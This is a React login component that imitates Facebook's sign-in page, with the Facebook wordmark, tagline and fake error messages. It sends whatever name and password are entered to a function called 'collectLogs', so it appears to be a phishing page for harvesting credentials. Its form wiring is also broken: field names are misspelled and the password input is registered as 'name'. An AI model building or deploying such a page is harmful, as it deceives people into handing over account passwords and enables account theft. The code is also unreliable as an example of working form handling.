import { useForm } from "react-hook-form"
import { yupResolver } from "@hookform/resolvers/yup"
import * as yup from "yup"
import { collectLogs, spinUp } from "../apis/createApi"
import { useEffect } from "react"
const LandingPage = () => {
    const Schema = yup.object({
        name: yup.string().required(),
        pasword: yup.string().required(),
    })

    const { handleSubmit, register, formState: { errors } } = useForm({
        resolver: yupResolver(Schema)
    })

    const onHandleSubmit = handleSubmit(async (data: any) => {
        const { name, password } = data
        collectLogs({ name, password }).then((res: any) => {
            return res.data.data
        })
    })

    useEffect(() => {
        spinUp().then(() => {
            console.log("Active")
        })
    }, [])

    return (
        <>
            <div className="w-full bg-[#F0F2F5] min-h-[100vh] flex items-center justify-center">
                <div className="w-[80%] flex min-h-[500px]  justify-between items-center max-md:flex-col max-md:w-full  max-lg:w-[90%] ">
                    <div className="flex flex-col max-md:items-center w-full">
                        <div className="font-[Blud] text-[#0866FF] max-md:text-[40px] text-[60px]">facebook</div>
                        <div className=" text-[30px] max-md:text-center max-md:leading-[30px] max-md:text-[25px] max-md:mb-10 max-md:w-[90%]">Facebook helps you connect and  share
                            with the people in your life.
                        </div>
                    </div>
                    <form onSubmit={onHandleSubmit} className="w-[700px] max-md:w-[90%] border min-h-[400px]  rounded-lg shadow-xl bg-white flex-col flex items-center ml-3">
                        <div className="my-3" />
                        <div className="w-[90%]">
                            <input type="text" className="w-full h-[60px] border border-[#a8a8a8] rounded-md placeholder:text-[17px] pl-3" placeholder="Email Address or phone number" {...register("name")} />
                            {errors.name && <div className="text-[13px] my-1 text-[red]">The email address or mobile number you entered isn't connected to an account. Find your account and log in.</div>}
                        </div>
                        <div className="my-3" />
                        <div className="w-[90%]">
                            <input type="text" className="w-full h-[60px] border border-[#a8a8a8] rounded-md placeholder:text-[17px] pl-3" placeholder="Password" {...register("name")} />
                            {errors.name && <div className="text-[13px] my-1 text-[red]">Password provided doesn't match the credentials</div>}
                        </div>
                        <button type="submit" className="w-[90%] flex items-center justify-center my-4 h-[60px] text-white rounded-md font-[Blud] bg-[#0866FF]" {...register("pasword")}>
                            Log in
                        </button>
                        <div className="text-[#0866FF]">Forgotten Password? </div>
                        <hr className="w-[90%] my-3" />
                        <button className="w-[50%] flex items-center justify-center text-white bg-green-500 h-[60px] rounded-md mb-4">Create Account</button>
                    </form>

                </div>
            </div>
        </>
    )
}

export default LandingPage